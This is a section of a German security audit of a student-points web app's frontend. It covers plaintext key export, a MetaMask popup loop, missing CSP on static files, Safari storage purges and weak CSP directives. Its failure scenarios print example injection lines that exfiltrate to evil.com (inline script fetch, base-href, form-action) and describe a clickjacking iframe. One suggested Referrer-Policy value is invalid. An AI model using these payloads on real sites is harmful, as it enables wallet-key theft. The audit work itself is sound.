# Bereich 5 — Frontend Wallet-Sicherheit & XSS

**Audit-Datum:** 2026-04-18
**Auditor:** Senior Auditor (Browser-Wallet-Security, XSS, CSP, MetaMask-Integration)
**Scope:** SPA `packages/frontend/`, CSP-Header in `packages/backend/src/server.ts`, Plesk-Static-Serve-Layout, MetaMask-Integration, localStorage-Wallet-Persistierung.
**V1-Baseline:** Es existiert KEIN V1-Audit für diesen Bereich (`docs/audit/06-bereich-5-frontend-wallet.md` fehlt). Bereich 5 V2 ist vollständig Greenfield. Es gibt keine V1-Findings, die hier obsolet werden.

---

## Executive Summary

Das Frontend ist **konzeptionell sauber strukturiert** — kein einziges `dangerouslySetInnerHTML`, keine `innerHTML`/`eval`/`document.write`, alle User-Inputs gehen via React-Children durch die eingebaute Auto-Escape-Pipeline, alle externen Links nutzen `rel="noopener noreferrer"`. Die offensichtlichen XSS-Vektoren sind geschlossen. Aber der Schein trügt:

1. **Drei Blocker** in der Wallet-Lifecycle-Sicherheit, die das gesamte Trust-Modell für studentische Wallets unterminieren — keiner davon ist ein klassischer „Bug", sondern alle sind bewusste Design-Entscheidungen, die das Risiko nicht ausreichend sichtbar machen oder nicht abfedern.
2. **Ein Blocker im Admin-Auth-Flow** (Infinite-MetaMask-Popup-Loop bei Rejection), recently shipped, von keinem Test gefangen.
3. **Eine fundamentale CSP-Schwachstelle** in der Plesk-Deploy-Konfiguration: das Helmet-Middleware-CSP greift nur für Express-bediente Pfade. Die statische SPA-Auslieferung läuft potentiell vorbei, abhängig von Plesk-Apache-Static-Serve-Optimierung — dieser Pfad ist im Audit nicht live verifizierbar, aber konstruktiv plausibel und im Repo nicht abgesichert.
4. **Defense-in-Depth fehlt durchgehend:** keine `frame-ancestors`, keine `object-src`/`base-uri`/`form-action`-Direktiven, kein CSP-Reporting, keine Permissions-Policy, keine ESLint-Regel gegen `dangerouslySetInnerHTML`, kein Schema-Lock auf Backend-Strings.
5. **Studi-Realität nicht eingeplant:** Safari iOS purge-t `localStorage` nach 7 Tagen Inaktivität — bei ~2.000 Studis/Jahr × 2 Jahre wird das hunderte Wallet-Verluste produzieren, ohne FAQ, ohne Recovery-Pfad, ohne iOS-spezifische Warnung.

**1 erfolgreicher XSS × tausende Studis × 2 Jahre = jede Wallet weg** — die ESLint/CSP-Defense-Layers fehlen alle, und die i18n-Konfig (`escapeValue: false`) ist ein Foot-Gun-Lager für die Zukunft.

**Severity-Verteilung:**

🔴 Blocker: 4
🟠 Major: 4
🟡 Minor: 3
⚪ Nit: 2

---

## Findings

### F5.1 🔴 Blocker — Klartext-Privatekey-Export ohne Keystore-V3-Verschlüsselung

**File:** `packages/frontend/src/lib/wallet.ts:191-208`
**Risiko:** Wallet-Total-Verlust bei jedem Cloud-Backup-Sync der Studi-Downloads.

**Problem.** Der Key-Export-Flow exportiert den Private-Key als **plain JSON** mit nur einem `note`-String, ohne jede Verschlüsselung:

```ts
export function downloadKeyFile(data: WalletData): void {
  const content = JSON.stringify(
    {
      address: data.address,
      privateKey: data.privateKey,
      note: 'Keep this file secure. Never share your private key.',
    },
    null,
    2,
  )
  const blob = new Blob([content], { type: 'application/json' })
  // ...
  a.download = `vpp-wallet-${data.address.slice(0, 8)}.json`
}
```

Die ethers v6 SDK bietet von Haus aus den Standard `Wallet.encrypt(password)`, der ein **Keystore-V3-JSON** mit PBKDF2/scrypt + AES-CTR erzeugt — exakt für diesen Anwendungsfall gebaut. Der aktuelle Code ignoriert das.

**Reproduktion (Studi-Realwelt):**

1. Studi klickt „Backup-Datei herunterladen" → `vpp-wallet-0xab12cd34.json` landet in `~/Downloads/`.
2. Studi nutzt iCloud Drive, Google Drive, OneDrive oder Dropbox-Auto-Sync für `~/Downloads/`. Standard auf allen modernen Macs (iCloud Desktop+Documents Sync) und vielen Windows-Setups.
3. Datei wird in der Cloud gespeichert. Studi vergisst sie.
4. 6 Monate später wird der Cloud-Account des Studis kompromittiert (Phishing, Reused-Password, geleaked aus haveibeenpwned-Quelle, malicious Browser-Extension, gestohlenes Device ohne Disk-Encryption).
5. Angreifer findet `vpp-wallet-*.json` → liest `privateKey` → ist Wallet.
6. Angreifer importiert in MetaMask, kann beliebige On-Chain-Aktionen ausführen.

**Schlimmer noch:** Studis werden den Backup auch per Mail an sich selbst schicken („damit ich es nicht verliere"). E-Mail-Postfächer sind notorisch unsicher (HSBI-Mail-Webclient ohne 2FA-Pflicht). Plus: der Dateiname enthält die Adresse → Cloud-Suche „vpp-wallet" findet sofort alle Dateien.

**Fix.** Keystore-V3-Verschlüsselung mit User-Passwort:

```ts
export async function downloadKeyFile(
  data: WalletData,
  password: string, // mind. 12 Zeichen, UI-validiert
): Promise<void> {
  if (data.type === 'metamask') return // MetaMask-Wallets haben keinen exportierbaren Key
  const wallet = new ethers.Wallet(data.privateKey)
  const encryptedJson = await wallet.encrypt(password) // Keystore V3, scrypt N=131072
  const blob = new Blob([encryptedJson], { type: 'application/json' })
  // ...
}
```

UI-Anpassung: `wallet-card.tsx` Download-Button öffnet einen Dialog, der nach einem Passwort fragt (`<input type="password">` mit Strength-Meter). Bestätigung doppelt, Hinweis dass der Key ohne Passwort unwiederbringlich ist.

**Recovery-Path-UX**: ImportWalletDialog (`wallet-dialogs.tsx:140-204`) muss um Keystore-V3-Detection erweitert werden — wenn der Import-String mit `{` startet und valide JSON ist, Passwort-Feld einblenden und `Wallet.fromEncryptedJson(json, password)` nutzen.

**2-Jahres-Begründung.** Bei ~2.000 aktiven Studis × 2 Jahre = ~4.000 Wallet-Lebenszyklen. Wenn 30 % davon irgendwann downloaden (konservativ — viele werden nicht, weil sie das UI-Hint nicht beachten), und davon 5 % in einem Cloud-/Mail-Leak landen, sind das **~60 kompromittierbare Wallets**. Jede dieser Wallets ist zwar pro Survey „nur" 0.5–2 Punkte wert, aber in Summe ist das Vertrauensverlust + HSBI-Imageschaden + potentiell DSGVO-relevant (Adress-Pseudonym = personenbezogenes Datum nach Erwägungsgrund 26).

---

### F5.2 🔴 Blocker — Admin-Auth Infinite-MetaMask-Popup-Loop bei Rejection

**File:** `packages/frontend/src/pages/admin.tsx:100-104`
**Risiko:** Admin verliert Zugang zum Admin-Dashboard ODER muss Browser-Tab forciert schließen, jedes mal wenn er die Sign-Anfrage versehentlich abbricht.

**Problem.** Der Auto-Auth-Effekt:

```tsx
useEffect(() => {
  if (adminCheck === 'admin' && !authenticated && !authLoading && !loggedOut) {
    handleAuth()
  }
}, [adminCheck, authenticated, authLoading, loggedOut, handleAuth])
```

Sobald `adminCheck === 'admin'` durchläuft, wird `handleAuth()` aufgerufen. Innerhalb davon:

```tsx
const handleAuth = useCallback(async () => {
  if (!wallet) return
  setAuthLoading(true)
  try {
    const timestamp = Math.floor(Date.now() / 1000)
    const message = `Admin login ${wallet.address} at ${timestamp}`
    const signature = await sign(message) // ← MetaMask-Popup
    setAuthCredentials({ signature, message })
    setAuthenticated(true)
  } catch (err) {
    toast.error(err instanceof ApiRequestError ? err.message : t('common.error'))
  } finally {
    setAuthLoading(false)
  }
}, [wallet, sign, t])
```

**Failure-Szenario.** Admin lehnt MetaMask-Popup ab (versehentlich, oder weil Maus über „Reject" hovert):

1. `signMessageMetaMask` wirft `Error('User denied message signature')`.
2. `catch` toastet die Fehlermeldung.
3. `finally` setzt `setAuthLoading(false)`.
4. React re-rendert: `authLoading` änderte sich `true → false`.
5. Effekt-Dependencies `[adminCheck, authenticated, authLoading, loggedOut, handleAuth]` haben sich geändert → Effekt läuft erneut.
6. Bedingung: `adminCheck==='admin'` (TRUE) && `!authenticated` (TRUE — wurde nie gesetzt) && `!authLoading` (TRUE — gerade auf false gesetzt) && `!loggedOut` (TRUE — kein Logout-Klick) → **handleAuth() läuft erneut → MetaMask-Popup öffnet sich wieder**.
7. Admin lehnt erneut ab → goto 1.

Die einzige Exit-Bedingung ist `loggedOut === true`, was nur durch `handleLogout()` gesetzt wird (`admin.tsx:274-279`). Aber der Logout-Button ist hinter dem Auth-Gate (`admin-auth-gate.tsx`) versteckt, der nicht-authenticated User gar nicht weiterklicken lässt. **Es gibt keinen UI-Pfad, um den Loop zu stoppen, außer Browser-Tab schließen.**

Bei MetaMask-Auto-Reject (User klickt im Popup-Stress „Cancel" weil er lieber den Tab wechseln will): Loop dauert solange, bis MetaMask das Popup-Spam selbst rate-limited, was dann andere DApps mitfängt.

**Verschärfend**: `signMessageMetaMaskFn` (`wallet.ts:108`) zeigt nach 600 ms einen „Open MetaMask"-Toast. Bei jedem Loop-Durchlauf erscheint der Toast, dauert ~600 ms bis weggeklickt, plus 60 s Sign-Timeout. Bei einer ablehnenden Rejection ist die Loop-Frequenz ca. 1× alle 1-2 Sekunden — User ist sofort im Spam, kann nicht mal mehr Tab schließen, weil dialog-modal ist (browser-blocking durch MetaMask-Popup-Focus).

**Fix.** Failure-Tracking-State, der den Auto-Auth-Effekt nach Rejection sperrt:

```tsx
const [authFailed, setAuthFailed] = useState(false)

const handleAuth = useCallback(async () => {
  if (!wallet) return
  setAuthLoading(true)
  setAuthFailed(false)
  try {
    // ...
    setAuthenticated(true)
  } catch (err) {
    setAuthFailed(true)
    toast.error(...)
  } finally {
    setAuthLoading(false)
  }
}, [wallet, sign, t])

useEffect(() => {
  if (adminCheck === 'admin' && !authenticated && !authLoading && !loggedOut && !authFailed) {
    handleAuth()
  }
}, [adminCheck, authenticated, authLoading, loggedOut, authFailed, handleAuth])
```

Plus: `AdminAuthGate` zeigt bei `authFailed === true` einen explicit „Erneut versuchen"-Button, der `setAuthFailed(false)` aufruft und so das nächste Auth-Run triggert. UI bleibt navigierbar, User behält Kontrolle.

**Verifikations-Test (fehlt komplett):**

```ts
// admin.test.tsx
it('does not re-trigger sign popup when user rejects', async () => {
  const sign = vi.fn().mockRejectedValueOnce(new Error('User denied'))
  // render with mocked sign + admin wallet
  await waitFor(() => expect(sign).toHaveBeenCalledTimes(1))
  await sleep(2000) // simulate React re-renders
  expect(sign).toHaveBeenCalledTimes(1) // FAIL ohne Fix: wird >1
})
```

**2-Jahres-Begründung.** Jeder Admin-Click ist eine reale Mensch-Interaktion. Wenn auch nur 1 Admin pro Quartal das versehentlich triggert (über 2 Jahre = 8 Vorfälle), ist das mindestens 8× HSBI-Helpdesk-Ticket („MetaMask geht nicht mehr"), 8× wütender Lehrender, plus die Möglichkeit dass MetaMask die Domain dauerhaft auf eine Block-Liste setzt nach Spam-Detection. Plus: Recently shipped (commit `e71e25b "fix(frontend): unblock admin dashboard and stop auto-login after logout"`) — der Fix selbst hat das neu eingeführt, weil der `loggedOut`-Guard den Rejection-Fall nicht abdeckt.

---

### F5.3 🔴 Blocker — CSP greift nicht für Static-SPA-Auslieferung auf Plesk

**Files:**

- `packages/backend/src/server.ts:35-110` (Express-Setup)
- `scripts/build-deploy-ci.sh:7-9, 25-26, 88-95` (Plesk-Layout)
- `packages/frontend/index.html` (kein meta-CSP-Fallback)

**Risiko:** Wenn Plesk-Apache statische Files direkt serviert (Standard-Performance-Optimierung bei Phusion-Passenger), bekommt der Browser für `/`, `/index.html`, `/assets/*.js`, `/assets/*.css` **keine CSP-Header**. Damit ist die gesamte CSP-Defense ungültig — der Browser-Default ist „alles erlaubt".

**Problem.** Der CSP-Header wird ausschließlich via Helmet-Middleware in Express gesetzt:

```ts
// server.ts:45-71
const helmetMiddleware = helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      // ...
    },
  },
})
app.use(helmetMiddleware)
```

Express serviert die SPA via `express.static(publicDir)` + `app.get('*', sendFile(index.html))` (`server.ts:104-110`). Solange ALLE Requests durch Express laufen, wird CSP gesetzt.

**Aber:** Das Plesk-Deploy-Layout (`scripts/build-deploy-ci.sh:7-9`):

```
# Plesk sets Anwendungsstamm = parent of Dokumentenstamm.
# With Dokumentenstamm = /httpdocs/packages/backend/public,
# Plesk expects app.js + package.json at /httpdocs/packages/backend/.
```

→ Die SPA-Build-Files (`index.html`, `assets/*.js`, `assets/*.css`) liegen direkt im **DocumentRoot von Apache**.

**Plesk-Default-Verhalten** (verifizierbar via Plesk-Doku, „Phusion Passenger and Static Files"): Apache liefert Files aus dem DocumentRoot **direkt aus**, ohne sie an Passenger weiterzuleiten, wenn das File existiert. Diese Optimierung ist Standard-Default und nicht vom .htaccess deaktiviert — die einzigen RewriteRules im `.htaccess` (`build-deploy-ci.sh:88-95`) sind Path-Excludes (`gsn/`, `vpp/`, `kits/`):

```apache
RewriteEngine On
RewriteRule ^gsn/ - [L,NC]
RewriteRule ^vpp/ - [L,NC]
RewriteRule ^kits/ - [L,NC]
AddType application/javascript .js
AddType application/xml .xml
```

→ **Kein `Header set Content-Security-Policy "..."`**, kein `PassengerEnabled on`/`SetHandler` Force-Pattern, keine `ProxyPass`-Forwarding. Apache wird für alle Static-File-Requests die Files direkt aus `packages/backend/public/` ausliefern, mit den Default-Apache-Headern (was CSP NICHT enthält).

**Verifikations-Pfad (im Audit nicht ausführbar, aber mandatorisch):**

```bash
# 1. Auf Production-Domain — schaut ob CSP-Header da ist
curl -sI https://vpstunden.hsbi.de/ | grep -i content-security-policy
curl -sI https://vpstunden.hsbi.de/index.html | grep -i content-security-policy
curl -sI https://vpstunden.hsbi.de/assets/index-XYZ.js | grep -i content-security-policy

# 2. Vergleich: API-Pfad — wo CSP DEFINITIV durch Express geht
curl -sI https://vpstunden.hsbi.de/api/v1/health | grep -i content-security-policy
```

Hypothese: API hat CSP, Static-Files nicht. Wenn das der Fall ist — Header hinzufügen via `.htaccess` ODER Plesk auf force-Passenger konfigurieren.

**Failure-Szenario, wenn CSP fehlt.**

1. Beliebige stored XSS irgendwo im System (Survey-Title, Admin-Label, Toast-Error, i18n-String — auch wenn aktuell sauber) wird zur Code-Execution.
2. Inline-Scripts (`<script>fetch('https://evil.com', ...)</script>`) sind erlaubt.
3. `eval()`, `new Function()`, JSONP, beliebige externe Scripts — alles erlaubt.
4. Browser-Default: kein `frame-ancestors` → Clickjacking auf `/admin` möglich.
5. localStorage-Wallet-Key kann von beliebigem Script ausgelesen und exfiltriert werden.

**Fix (zwei parallele Wege).**

**Weg A** (sofort, robust): Plesk-`.htaccess` setzt CSP statisch:

```apache
# Sicherheits-Header für Static-Files (Apache liefert direkt aus DocumentRoot)
<IfModule mod_headers.c>
  Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' https://mainnet.base.org https://base.publicnode.com https://1rpc.io/base https://base.drpc.org; frame-ancestors 'none'; object-src 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests"
  Header always set X-Content-Type-Options "nosniff"
  Header always set Referrer-Policy "no-referrer-strict-origin-when-cross-origin"
  Header always set Permissions-Policy "geolocation=(), camera=(), microphone=(), payment=(), usb=()"
</IfModule>
```

Doppelter Schutz: jede Response (statisch + Express) hat dann CSP, auch wenn Apache vor Passenger raus-shortcut.

**Weg B** (cleaner, aber Plesk-Konfig-Touch nötig): Anwendungsstamm = Dokumentenstamm + Plesk-Wildcard-Match auf Passenger, sodass NICHTS direkt von Apache ausgeliefert wird. Operativ heikler — `lftp`-Deploy muss dann den Apache-DocumentRoot leer halten und Express alles serveren. Performance-Cost (Express schiebt alle Static-Files durch Node.js).

**Zusätzlich:** Falls Weg A nicht möglich (Plesk-Hosting-Provider verbietet `Header`-Direktiven in `.htaccess`): index.html bekommt ein `<meta http-equiv="Content-Security-Policy" content="...">`-Fallback. Schwächer (CSP-Reports nicht möglich, manche Direktiven wie `frame-ancestors` werden ignoriert), aber besser als nichts.

**2-Jahres-Begründung.** CSP ist die letzte Defense-Layer für jeden noch-nicht-entdeckten XSS. Über 2 Jahre Production: i18n-PR-Reviews werden müder, neue Features kommen rein, irgendwann landet ein `dangerouslySetInnerHTML` oder eine Script-Tag-Injection im Code. Ohne CSP ist der erste solche Fehler ein Total-Compromise (alle Wallets, alle Admin-Sessions). Mit CSP ist es ein Bug, der gefixt wird, ohne dass Daten abfließen. **Defense-Layer-Loss × Zeit = Wahrscheinlichkeit eines Total-Compromise → 1.**

---

### F5.4 🔴 Blocker — Safari iOS ITP purge-t Wallet nach 7 Tagen, kein Recovery-Pfad

**Files:**

- `packages/frontend/src/lib/wallet.ts:167-188` (localStorage-Persistierung)
- `packages/frontend/src/locales/de.json` (kein FAQ-String für Wallet-Verlust)

**Risiko:** Bei ~2.000 Studis/Jahr × 2 Jahre × Anteil iOS-Safari ≈ 30 % × Inaktivitäts-Wahrscheinlichkeit ≈ 50 % → **600+ verlorene Wallets** über 2 Jahre. Punkte sind on-chain noch da, aber an die alte Adresse gebunden — für den Studi praktisch verloren.

**Problem.** Apples **Intelligent Tracking Prevention (ITP)** löscht `localStorage` und `sessionStorage` für Origins, die in den letzten 7 Tagen nicht aktiv besucht wurden. Aktiv heißt: User klickt eine User-Interaktion (Tap, Klick), nicht Background-Tab oder Push-Notification.

Das VPP-Use-Case-Pattern:

1. Studi macht Survey #1 in Woche 1 → Wallet generiert, in localStorage gespeichert.
2. Studi macht keine Surveys 2-3 Wochen lang.
3. Survey #2 kommt in Woche 4 → Studi öffnet `/claim?s=42&n=...&t=...`.
4. **localStorage.getItem('vpp-wallet') === null** (von ITP gepurged in Woche 2).
5. `useWallet().loadWallet()` returns `null`. UI zeigt „Du hast noch keine Wallet — erstelle eine".
6. Studi erstellt neue Wallet → andere Adresse → Punkte aus Survey #1 sind „weg" (an alte Adresse gebunden).

**Bestehender UI-Pfad (`claim.tsx:158-173`):**

```tsx
{
  currentStep === 'wallet' && !hasWallet && (
    <Card>
      <CardHeader>
        <CardTitle>{t('claim.steps.wallet')}</CardTitle>
        <CardDescription>{t('claim.noWallet')}</CardDescription>
      </CardHeader>
      <CardContent>
        <Button onClick={() => navigate('/points')}>{t('claim.createFirst')}</Button>
      </CardContent>
    </Card>
  )
}
```

→ Studi sieht „Erstelle eine Wallet" — keine Anzeige „Hattest du schonmal eine? Importiere sie via Backup-Datei". Der Importieren-Pfad existiert in `/points`, ist aber nicht im Claim-Flow sichtbar.

**Verifikations-Quelle:** Apple WebKit Blog, „Full Third-Party Cookie Blocking and More" (2020-03-24): „A 7-day cap on all script-writeable storage, including LocalStorage, IndexedDB, ServiceWorker registrations". Bestätigt für Safari iOS 13.4+ (= alle aktuell genutzten iOS-Versionen).

**Failure-Szenario kombiniert mit F5.1 (Klartext-Download).** Studi macht **kein** Backup (typisch). Plus iOS-ITP-Purge → Wallet weg. Studi macht **doch** Backup → kompromittierbar via Cloud-Sync (siehe F5.1). Beide Pfade sind problematisch für Studi-Realität.

**Fix (mehrteilig).**

1. **Claim-Flow-UX-Fix:** `claim.tsx:158-173` ergänzen um zweiten Button „Bestehende Wallet importieren" + Direct-Link zum `/points` Import-Dialog mit `?import=true`-Param.
2. **iOS-Detection + Persistente Warnung:** `points.tsx` zeigt einen permanent-sichtbaren Banner für iOS-Safari-User: „**Wichtig auf iPhone/iPad**: Safari löscht deine Wallet nach 7 Tagen Inaktivität. Lade dir jetzt deinen Backup-Key herunter, sonst sind deine Punkte verloren."
   ```tsx
   const isIosSafari =
     /iP(hone|ad|od)/.test(navigator.userAgent) &&
     /Safari/.test(navigator.userAgent) &&
     !/CriOS|FxiOS/.test(navigator.userAgent)
   ```
3. **FAQ-Eintrag** in `de.json`/`en.json` + Link aus `WalletSetup`/`WalletCard`: „Wallet weg? Drei häufige Gründe und wie du wieder Zugang bekommst."
4. **Optional (Long-term):** WebAuthn-/Passkey-basierte Wallet-Derivation. Apple synct Passkeys via iCloud Keychain unwiderruflich. Wallet-Key wird via PRF-Extension aus dem Passkey abgeleitet. Funktioniert sogar plattformübergreifend (iCloud auf Mac, andere Wallet-Backups via Passkey-Sharing). Architektur-Aufwand: ~2 Wochen.

**2-Jahres-Begründung.** Die ITP-Purge ist nicht „möglich" sondern „passiert garantiert" für jeden iOS-Safari-User mit >7 Tagen Inaktivität. Bei einem Use-Case mit Surveys alle 2-4 Wochen pro Studi und einem iOS-Anteil >25 % bei deutschen Studierenden ist das ein **strukturelles** Problem. Über 2 Jahre wird das hunderte Wallet-Verluste produzieren — jeder davon = HSBI-Imageschaden + Helpdesk-Aufwand + Studi-Frustration + ggf. Beschwerden bei der Datenschutzbehörde („HSBI versprach mir Punkte und gab sie mir nicht").

---

### F5.5 🟠 Major — Fehlende `frame-ancestors`-CSP-Direktive ermöglicht Clickjacking

**Files:**

- `packages/backend/src/server.ts:45-71` (CSP-Direktiven)

**Risiko:** Malicious Site iframed `vpstunden.hsbi.de/admin` oder `/claim` und coerzt User-Klicks via UI-Redress.

**Problem.** Die CSP-Direktiven enthalten **kein `frame-ancestors`**:

```ts
directives: {
  defaultSrc: ["'self'"],
  scriptSrc: ["'self'"],
  styleSrc: ["'self'", "'unsafe-inline'"],
  imgSrc: ["'self'", 'data:', 'blob:'],
  fontSrc: ["'self'"],
  connectSrc: [...],
  // KEIN frame-ancestors
},
```

`defaultSrc: 'self'` deckt das **NICHT** ab — `frame-ancestors` muss explizit gesetzt werden, sonst gilt der Browser-Default (= alles erlaubt).

**Mitigation aktuell:** Helmet's `frameguard` (default `deny`) setzt `X-Frame-Options: DENY`. Das funktioniert in modernen Browsern noch, aber:

- `X-Frame-Options` wird von W3C/CSP-Working-Group als **deprecated** geführt zugunsten `frame-ancestors`.
- Manche Browser-Engines (insb. mobile Browser, embedded WebViews) ignorieren X-Frame-Options bereits zugunsten von CSP.
- Bei Konflikt zwischen X-Frame-Options und `frame-ancestors` gewinnt CSP — wenn jemand also `frame-ancestors *` setzt (versehentlich oder bösartig durch Misconfig), ist der `X-Frame-Options: DENY`-Schutz weg.

**Failure-Szenario.**

1. Angreifer baut `https://gewinnspiel-uni-bielefeld.example.com/` mit Inhalt: „Klick hier für 50€ Gutschein!".
2. Auf der Seite ist ein 1×1-px transparenter Iframe mit `<iframe src="https://vpstunden.hsbi.de/admin" style="opacity:0; position:absolute;">`.
3. Iframe positioniert genau über dem „Gewinnspiel-Button", sodass Admin-Klick auf den Button stattdessen einen Klick im Admin-Dashboard auslöst (z. B. „Survey löschen" oder „Admin entfernen").
4. Admin ist gerade in einem anderen Tab eingeloggt (Auth-Cookie/State noch aktiv), Klick wird durchgereicht → unwished State-Change.

Bei `/claim`: Angreifer legt Iframe über „Punkte erhalten"-Knopf, lockt Studi mit „Gratis-Wifi-Code". Studi klickt → Sign-Anfrage geht raus mit Studi's Wallet → Studi sieht MetaMask-Popup, denkt es ist für Wifi → signiert → Punkte werden für eine Survey beansprucht, die der Studi nicht gemacht hat. **Verbrennt einen Nonce**, blockiert legit Submit.

**Fix.** CSP-Direktive ergänzen:

```ts
directives: {
  // ...
  frameAncestors: ["'none'"],     // niemand darf uns iframen
  objectSrc: ["'none'"],          // <object>/<embed>/<applet> blocken
  baseUri: ["'self'"],            // <base href="..."> nur self
  formAction: ["'self'"],         // Forms nur an uns
}
```

**2-Jahres-Begründung.** Clickjacking ist nicht hypothetisch — die OWASP-Top-10 listet es explizit. Über 2 Jahre Production-Lebensdauer wird `vpstunden.hsbi.de` SEO-Sichtbarkeit gewinnen, in HSBI-internen Newslettern erwähnt, in Studi-WhatsApp-Gruppen geteilt. Damit wird es ein attraktives Target für Phishing-Klone, die mit „Gratis"-Locks arbeiten. Eine 1-Zeile-CSP-Direktive ist die Defense.

---

### F5.6 🟠 Major — Fehlende `object-src`/`base-uri`/`form-action`-Direktiven

**File:** `packages/backend/src/server.ts:45-71`
**Risiko:** Defense-in-Depth-Lücken, die im Falle eines partiellen XSS die Eskalation ermöglichen.

**Problem.** Drei kritische CSP-Direktiven fehlen — `defaultSrc: 'self'` deckt sie **NICHT** ab, weil sie eigene Direktiv-Klassen sind:

| Fehlend              | Was passiert ohne                                                                       | Konkrete Eskalation                                                                                                                                       |
| -------------------- | --------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `object-src 'none'`  | `<object>`, `<embed>`, `<applet>` mit beliebigen Quellen erlaubt                        | Flash-Style-Plugin-Loading (alte Browser), PDF-Viewer-XSS-Pivots, Java-Applet-Resurrection.                                                               |
| `base-uri 'self'`    | `<base href="https://evil.com/">` ändert Resolution aller relativen URLs                | Alle relativen `<script src="...">`, `<link href="...">` werden plötzlich von `evil.com` geladen. Mit gefundenem HTML-Injection-Punkt = Total-Compromise. |
| `form-action 'self'` | `<form action="https://evil.com/login" method="POST">` exfiltriert beliebige POST-Daten | Stealing von Sign-Requests, MetaMask-Connect-Anfragen, Admin-Aktionen.                                                                                    |

Bei keinem dieser Vektoren reicht ein klassisches `defaultSrc: 'self'` als Schutz aus.

**Failure-Szenario (`base-uri`).** Angenommen, in einer zukünftigen Version landet ein HTML-Injection-Punkt im Code (z. B. neuer Survey-Titel mit fehlerhafter Sanitization). Angreifer injiziert:

```html
<base href="https://evil.com/" />
```

Ab dann werden alle relativen URLs auf der Page (inkl. `<script src="/assets/index-XYZ.js">` aus React-Hydration) gegen `evil.com` aufgelöst. Browser läd `https://evil.com/assets/index-XYZ.js` → Angreifer-JS läuft im VPP-Origin-Context → liest localStorage → Wallet-Key weg. **CSP `script-src 'self'` würde das BLOCKIEREN, aber nur wenn `'self'` als die ursprüngliche Domain interpretiert wird — was Browser tun. Trotzdem: kein Defense-in-Depth.**

**Fix.** Siehe F5.5 — eine Code-Edit für alle drei.

**2-Jahres-Begründung.** Diese Direktiven sind Standard in modernen Web-Apps (siehe Stripe-, GitHub-, Cloudflare-Header-Beispiele). Sie kosten 3 Code-Zeilen, brechen nichts, und schliessen Eskalations-Pfade die im Falle eines partiellen XSS aktivierbar werden. Die Mehrkosten = 0, der Schutz-Nutzen-Faktor = hoch.

---

### F5.7 🟠 Major — localStorage-Permanenz im Standard-UI-Flow nicht kommuniziert

**Files:**

- `packages/frontend/src/components/points/wallet-setup.tsx` (Initial-Wallet-Erstellung)
- `packages/frontend/src/components/points/wallet-dialogs.tsx:216-307` (CreateWalletDialog)
- `packages/frontend/src/components/points/wallet-card.tsx` (Active-Wallet-View)

**Risiko:** Studi versteht nicht, dass Browser-Cache-Clear oder Browser-Wechsel = Wallet weg = Punkte verloren.

**Problem.** Der `CreateWalletDialog` (`wallet-dialogs.tsx:216-307`) hat zwar einen Bestätigungs-Flow mit drei Checkboxen — aber die Texte sind **i18n-Strings** (`wallet.create.dialogCheck1/2/3`) und in `de.json` enthalten sie nicht spezifisch:

- „Wenn du deinen Browser-Cache leerst (auch versehentlich), ist deine Wallet weg."
- „Wenn du in einem anderen Browser oder Inkognito-Modus arbeitest, hast du KEINEN Zugang zu dieser Wallet."
- „Wenn du dein Gerät verlierst und kein Backup hast, sind deine Punkte unwiderruflich verloren."

Stattdessen sind die `dialogCheck`-Texte allgemeiner und betonen Sicherheit, nicht Persistenz-Risiken.

**Verschärfend:** Nach erfolgreichen Klick „Wallet erstellen" sieht der Studi nur einen Toast `t('wallet.create.success')` und einen `WalletCard` mit Adresse. Es gibt **keinen** automatischen Backup-Reminder, kein Modal, kein „Lade jetzt deinen Backup-Key runter, bevor du weiterklickst!".

**Fix.**

1. `wallet.create.dialogCheck*` in beiden Sprachen umtexten (siehe oben).
2. Direkt nach erstem `setWallet(data)` in `useWallet.create()`: Open `<DownloadKeyDialog>` automatisch (mit gleichem F5.1-Verschlüsselungs-Workflow).
3. `WalletCard` zeigt einen permanenten Warning-Banner bis User explizit „Backup gesehen" klickt (gespeichert in localStorage als `vpp-backup-acknowledged: true`).
4. iOS-Safari-spezifischer Banner zusätzlich (siehe F5.4).

**2-Jahres-Begründung.** Studis sind nicht Crypto-Native. Sie behandeln „Wallet" mental wie „Account" (server-seitig persistent, kann ich überall einloggen). Über 2 Jahre = jeder Studi macht im Schnitt 2-3 Surveys, und mindestens 10-15 % von ihnen werden in der Zwischenzeit ihren Browser wechseln, Cache leeren oder Inkognito nutzen. Ohne explizite Warnung = sie sind überrascht und verärgert.

---

### F5.8 🟠 Major — `connect-src` listet 14 RPC-Provider, Frontend nutzt 0

**File:** `packages/backend/src/server.ts:53-68`

**Problem.** Die CSP `connectSrc`-Liste:

```ts
connectSrc: [
  "'self'",
  'https://base.drpc.org',
  'https://1rpc.io',
  'https://*.base.org',
  'https://*.basescan.org',
  'https://*.basescan.com',
  'https://*.publicnode.com',
  'https://*.alchemy.com',
  'https://*.alchemyapi.io',
  'https://*.g.alchemy.com',
  'https://*.infura.io',
  'https://*.quiknode.pro',
  'https://*.ankr.com',
  'https://*.blockpi.network',
],
```

Das Frontend nutzt davon **keine direkte Verbindung** — alle Blockchain-Reads gehen über das Backend (`use-blockchain.ts:32-34` baut zwar einen `ethers.JsonRpcProvider` mit `config.rpcUrl`, der jetzt aber `import.meta.env.VITE_RPC_URL` ist und in der Production-`.env` typischerweise auf das Backend zeigt — siehe Cross-Cutting in Bereich 3 F3.10).

**Auswirkung.** Bei einem zukünftigen XSS hat der Angreifer 13 zusätzliche Exfiltration-Pfade. `*.alchemy.com` reicht — Angreifer registriert sich gratis bei Alchemy, bekommt eine Subdomain wie `eth-mainnet.g.alchemy.com/v2/MY_TOKEN`, exfiltriert Wallet-Keys in einer URL-Query.

**Fix.** Auf das tatsächlich Genutzte einschränken:

```ts
connectSrc: [
  "'self'",
  // Nur falls VITE_RPC_URL auf Public-RPC zeigt (aktuell: Backend)
  // 'https://mainnet.base.org',
],
```

Plus: ESLint-/Test-Regel, dass `import.meta.env.VITE_RPC_URL` in Production immer auf `'self'` (= eigene Domain) zeigt.

